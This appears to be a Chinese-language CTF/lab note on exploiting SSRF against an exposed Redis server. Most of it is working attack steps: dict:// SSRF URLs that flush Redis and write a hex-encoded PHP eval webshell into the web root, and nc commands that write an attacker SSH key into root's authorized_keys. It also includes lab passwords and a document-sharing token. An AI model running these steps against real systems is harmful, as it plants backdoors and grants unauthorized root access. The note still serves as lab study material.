---
title: csrf,ssrf与redis
---

https://www.yuque.com/g/sunwu-pbywz/qkn3v7/ydc98kwfrmhqg5kb/collaborator/join?token=QhkGvicz5ceso1EN&source=doc_collaborator# 《ssrf+redis》

### ssrf与rsdis

环境

\1. 密码hello

\2. su root 密码 xbw

cd ./redis-2.8.17/src

./redis-server ../redis.conf

如果想redis写公私钥，需要su root

cd /root

mkdir .ssh

流程

http://192.168.147.130/app1/robots.txt

1.the server port 5562 is running and it's a web application

2.为了避免被⿊客攻击，我把服务器的redis端⼝设置为6378了 把ssh端⼝ 设置为21

localhost:5562

获得flag1

welcome to PTS Testing

key1:F5Qyixeq

dict://localhost:6378/flushall
dict://localhost:6378/config:set:dir:/var/www/html/app1
dict://localhost:6378/config:set:dbfilename:hh.php
dict://localhost:6378/set:1:"\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e"
dict://localhost:6378/save
找到第二个flag ，webshell密码w

### 免密登录

本地没有ssh公私钥的ssh-keygen -t rsa⽤这个⽣成

nc 192.168.147.130 6378
ping 
flushall
config set dir /root/.ssh/
config  set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDR9YQQg0L7Y5ELAmnrAZHZybUaMW0589G3RKq4BL+CDtKUwFKjLEkiI9CIgHIg/5vJYuipHFDVHXwtGlqc9Uwc9gJOopk7DFSSpTR2CPZpXnWgBGmq+G5BfmIZho+ZqlqyG9JjC+wpdXRhnHrB4VsDOV8vln6/UDhWvdOcYzV2Wr7D8y89yHg3Gzgl1poe6J0D5UIlLH+EWHbMA0A0wn2KiG/uVH7TXypbO0TLKIVPcZXF5bY3rN8PRaMbvQQWOLwzjqj7YDr4GRUz3nfsfgIOy8KOsuByH7J3poE5YUfy0KJ2UsA0/87T0OTVkSb5+gzgAhz0TDI8rxumLrzng0cD8Gt72jftUoxCHUPUnF0+t5rKje2bydP8avT3q9Kdooo/B6gSHP2tabTp71GuxT5Yfuqj8DMCErn+0yrIXF8pUMKT3QKiV5NAn3ORGGWB/T+5jdLIyTdPv0RPkjPySjrQ2VmCbuBIWsKPnlAhQwOeEgk6W/GPLmJ42x+8nuM77c= root@kali\n\n\n"
save